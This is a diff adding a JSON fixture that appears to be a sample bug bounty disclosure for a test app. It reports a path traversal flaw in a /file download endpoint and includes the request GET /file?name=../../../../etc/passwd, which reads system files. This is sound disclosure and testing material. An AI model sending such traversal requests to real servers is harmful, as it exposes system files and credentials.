@@ -1,0 +1,14 @@
+{
+  "id": 900005,
+  "title": "Path Traversal in File Download Endpoint Allows Reading System Files",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "visibility": "full",
+  "team": {"handle": "resurface-testapp", "name": "Resurface Test App"},
+  "reporter": {"username": "demo_hacker"},
+  "weakness": {"id": 19, "name": "Path Traversal"},
+  "vulnerability_information": "## Summary\nThe file download endpoint at `/file` is vulnerable to path traversal. The `name` parameter is used directly in a file path without sanitization, allowing an attacker to read arbitrary files from the server filesystem.\n\n## Steps to Reproduce\n1. Access the normal file endpoint:\n   ```\n   GET /file?name=readme.txt HTTP/1.1\n   Host: target.com\n   ```\n   This returns the readme file normally.\n\n2. Use path traversal to read /etc/passwd:\n   ```\n   GET /file?name=../../../../etc/passwd HTTP/1.1\n   Host: target.com\n   ```\n3. The server returns the contents of /etc/passwd\n\n## Proof of Concept\n```http\nGET /file?name=../../../../etc/passwd HTTP/1.1\nHost: target.com\n```\n\nThe server responds with the contents of `/etc/passwd`, confirming arbitrary file read.\n\n## Impact\n- Read any file accessible to the web server process\n- Access to /etc/passwd reveals system users\n- Access to configuration files could expose database credentials\n- Potential to read application source code and discover further vulnerabilities",
+  "disclosed_at": "2025-10-05T14:00:00.000Z",
+  "bounty_amount": "1500.0"
+}
